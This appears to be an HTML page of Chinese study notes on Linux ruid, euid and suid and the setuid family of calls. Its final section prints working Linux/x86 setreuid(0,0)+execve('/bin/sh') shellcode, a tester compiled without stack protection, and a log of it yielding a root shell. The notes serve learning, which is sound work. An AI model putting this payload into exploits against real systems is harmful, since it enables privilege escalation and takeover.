@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title># uid 之 ruid，euid，suid,uid 之 ruid，euid，suid</title>
+    <link rel="stylesheet" href="/assets/css/notes.min.css">
+</head>
+<body>
+    <div class="main-content-wrapper">
+        <main class="content">
+            <h1>uid 之 ruid，euid，suid</h1>
+<h2>1.基本概念</h2>
+<ul>
+<li>RUID：real user id，程序执行前，命令行显示的用户</li>
+<li>EUID：effective user id，进程当前的权限身份，决定进程可以执行哪些操作，当不具有 suid 时，与 ruid 相同，否则开始被初始化为程序的拥有者。经常在程序执行期间进行改变，以改变执行权限</li>
+<li>SUID：saved user id，保存的有效用户 ID，用于后续可能恢复权限的情况</li>
+</ul>
+<h2>2.权限控制函数</h2>
+<p>设置的 id 必须为系统中存在的用户 id 或组 id，用户 id 存在于/etc/passwd 文件中，而组 id 存在于/etc/group 文件中</p>
+<p>获取用户id/组id：</p>
+<pre><code class="language-c">//这些函数都没有出错返回
+#include &lt;unistd.h&gt;
+uid_t getuid(void);     //返回：调用进程的实际用户ID
+uid_t geteuid(void);    //返回：调用进程的有效用户ID
+uid_t getresuid(void);  //返回：调用进程的设置用户ID
+gid_t getgid(void);     //返回：调用进程的实际组ID
+gid_t getegid(void);    //返回：调用进程的有效组ID
+gid_t getresgid(void);  //返回：调用进程的有效组ID
+</code></pre>
+<h3>2.1 setuid()</h3>
+<pre><code class="language-c">int setuid(uid_t uid);
+</code></pre>
+<p>首先请求内核将本进程的 ruid, euid 和 suid 都设置成函数指定的 uid, 若权限不够则请求只将 effective uid 设置成 uid, 再不行则调用失败</p>
+<h3>2.2 seteuid()</h3>
+<pre><code class="language-c">int seteuid(uid_t euid);
+</code></pre>
+<p>无论什么情况，它只改变进程euid，而不改变ruid和suid，仅请求内核将本进程的 euid 设置成函数指定的 uid</p>
+<h3>2.3 setreuid()</h3>
+<pre><code class="language-c">int setreuid(uid_t ruid,uid_t euid);
+</code></pre>
+<p>交换id</p>
+<h2>3.shellcode</h2>
+<p>Linux/x86 - setreuid(0, 0) + execve(“/bin/sh”) Shellcode (29 bytes)：</p>
+<pre><code class="language-c">$ gcc -fno-stack-protector -z execstack shellcode_tester.c -o shellcode
+shellcode_tester.c: In function ‘main’:
+shellcode_tester.c:25:2: warning: incompatible implicit declaration of built-in function ‘printf’ [enabled by default]
+shellcode_tester.c:25:24: warning: incompatible implicit declaration of built-in function ‘strlen’ [enabled by default]
+$ sudo chown root:root ./shellcode
+$ sudo chmod u+s ./shellcode
+$ ./shellcode
+Length: 29
+# id
+uid=0(root) gid=1000(artur) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(artur)
+
+*/
+
+char shellcode[] = &quot;&quot;
+	&quot;\x31\xc0&quot;		// clear eax, as we don't know its state
+	&quot;\xb0\x46&quot;		// syscall setreuid
+	&quot;\x31\xdb&quot;		// real user ID = 0
+	&quot;\x31\xc9&quot;		// effective user ID = 0
+	&quot;\x99&quot;			// saved set-user-ID = 0 (using EDX)
+	&quot;\xcd\x80&quot;		// call it
+
+	&quot;\x96&quot;			// clear eax, as we don't know its state after former syscall
+	&quot;\xb0\x0b&quot;		// syscall execve
+	&quot;\x53&quot;			// NULL string terminator
+	&quot;\x68\x2f\x2f\x73\x68&quot;	// //sh
+	&quot;\x68\x2f\x62\x69\x6e&quot;	// /bin
+	&quot;\x89\xe3&quot;		// pointer to above string - path to the program to execve
+	&quot;\xcd\x80&quot;;		// call it
+
+void main(void)
+{
+	printf(&quot;Length: %d\n&quot;,strlen(shellcode));
+	((void(*)(void))shellcode)();
+}
+</code></pre>
+
+        </main>
+    </div>
+</body>
+</html>
